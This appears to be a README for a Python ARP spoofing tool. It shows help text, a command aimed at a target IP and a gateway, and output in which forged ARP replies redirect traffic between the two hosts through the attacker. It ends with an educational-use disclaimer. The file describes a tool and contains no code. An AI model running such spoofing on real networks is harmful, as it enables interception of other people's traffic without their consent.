# ARP Spoofer
Python 3.9+ is required, tested on Kali Linux.

## Example Usage
```shell
python3 arpspoof.py -h
usage: spoof.py [-h] [--verbose] target gateway

positional arguments:
  target      Please specify target IP address
  gateway     Please specify default gateway IP address

optional arguments:
  -h, --help  show this help message and exit
  --verbose
```

```shell
python3 arpspoof.py 192.168.0.17 192.168.0.1
```

Output
```
[+] Enabling IP forwarding.
[+] IP forwarding enabled.
[+] Sent to 192.168.43.155 : 192.168.43.1 is at 00:0c:29:bf:00:3f
[+] Sent to 192.168.43.1 : 192.168.43.155 is at 00:0c:29:bf:00:3f

```

## Disclaimer
All information and software available in this probject are for educational purposes only. Use these at your own discretion, the author cannot be held responsible for any damages caused. Usage of these tools for attacking targets without prior mutual consent is illegal.